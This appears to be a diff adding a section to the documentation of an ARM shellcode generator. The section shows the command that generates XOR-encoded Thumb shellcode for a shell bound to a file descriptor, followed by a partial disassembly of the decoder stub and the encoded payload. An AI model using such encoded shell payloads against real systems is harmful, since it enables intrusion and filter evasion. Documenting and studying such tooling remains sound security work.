@@ -59,3 +59,34 @@ Linux linaro-developer 3.2.0 #7 SMP Thu Feb 28 16:20:18 PST 2013 armv7l armv7l a
 [pid  1247] [2aadefac] uname({sys="Linux", node="linaro-developer", ...}) = 0
 </snip>
 ```
+
+#### disassemble shellcode with XOREncoder ####
+
+```asm
+$ scgen -a thumb dupsh 4 -x -f r| asem -d -a arm
+
+0x00000000 (0000): 42 80 8f e2   add      r8, pc, #0x42 <= XOR Encoder start at here
+0x00000004 (0004): d6 40 a0 e3   mov      r4, #0xd6
+0x00000008 (0008): 20 60 8f e2   add      r6, pc, #0x20
+0x0000000c (0012): 01 0c 54 e3   cmp      r4, #0x100
+0x00000010 (0016): 16 ff 2f 81   bxhi     r6
+0x00000014 (0020): d6 40 44 e2   sub      r4, r4, #0xd6
+0x00000018 (0024): 04 50 d8 e7   ldrb     r5, [r8, r4]
+0x0000001c (0028): 02 50 25 e2   eor      r5, r5, #2
+0x00000020 (0032): 04 50 c8 e7   strb     r5, [r8, r4]
+0x00000024 (0036): d7 40 84 e2   add      r4, r4, #0xd7
+0x00000028 (0040): f7 ff ff ea   b        #0xc
+0x0000002c (0044): f4 ff ff eb   bl       #4
+0x00000030 (0048): 01 60 8f e2   add      r6, pc, #1
+0x00000034 (0052): 16 ff 2f e1   bx       r6
+0x00000038 (0056): 6d 1b 01 35   strlo    r1, [r1, #-0xb6d] <== thumb mode start at here
+0x0000003c (0060): b6 1b 60 b4   strbtlt  r1, [r0], #-0xbb6
+0x00000040 (0064): 60 b4 68 46   strbtmi  fp, [r8], -r0, ror #8
+0x00000044 (0068): 69 46 a2 27   strhs    r4, [r2, sb, ror #12]!
+0x00000048 (0072): 01 df 01 23   movwhs   sp, #0x1f01
+0x0000004c (0076): 3d 25 90 18   ldmne    r0, {r0, r2, r3, r4, r5, r8, sl, sp}
+0x00000050 (0080): 06 27 2a 1e   cdpne    p7, #2, c2, c10, c6, #0
+0x00000054 (0084): 03 3b 03 dd   vstrle   d3, [r3, #-0xc]
+...
+
+```
